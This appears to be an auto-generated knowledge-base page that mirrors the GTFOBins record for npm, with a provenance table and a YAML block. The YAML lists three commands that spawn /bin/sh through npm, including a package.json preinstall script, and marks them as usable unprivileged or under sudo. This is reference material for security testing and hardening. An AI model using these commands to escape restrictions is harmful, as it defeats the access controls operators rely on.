---
parsed_by: focuslocust
source: gtfobins
type: generated
---
# npm

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Type | `tool` |
| Record ID | `npm` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/npm` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [npm](../../tools/linux/npm.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | npm |
| name | npm |
| type | tool |
| source | gtfobins |
| url | https://gtfobins.github.io/gtfobins/npm/ |

## Preserved Source Material

```yaml
_body: ''
_name: npm
_source_path: /home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/npm
functions:
  shell:
  - code: npm exec /bin/sh
    contexts:
      sudo: null
      unprivileged: null
  - code: 'echo ''{"scripts": {"preinstall": "/bin/sh"}}'' >package.json

      npm -C . i'
    contexts:
      sudo: null
      unprivileged: null
  - code: 'echo ''{"scripts": {"xxx": "/bin/sh"}}'' >package.json

      npm -C . run xxx'
    contexts:
      sudo: null
      unprivileged: null
```
